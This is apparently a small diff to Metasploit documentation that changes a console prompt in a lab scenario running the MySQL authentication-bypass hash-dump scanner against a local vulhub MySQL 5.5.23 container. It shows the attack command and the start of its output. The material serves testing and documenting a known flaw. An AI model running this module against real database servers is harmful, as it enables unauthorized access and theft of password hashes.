@@ -32,7 +32,7 @@ docker run -it --rm -p 3306:3306 vulhub/mysql:5.5.23
 ## Scenarios
 
 ```msf
-msf6 auxiliary(scanner/mysql/mysql_authbypass_hashdump) > rerun rhost=127.0.0.1
+msf auxiliary(scanner/mysql/mysql_authbypass_hashdump) > rerun rhost=127.0.0.1
 [*] Reloading module...
 
 [+] 127.0.0.1:3306        - 127.0.0.1:3306 The server allows logins, proceeding with bypass test
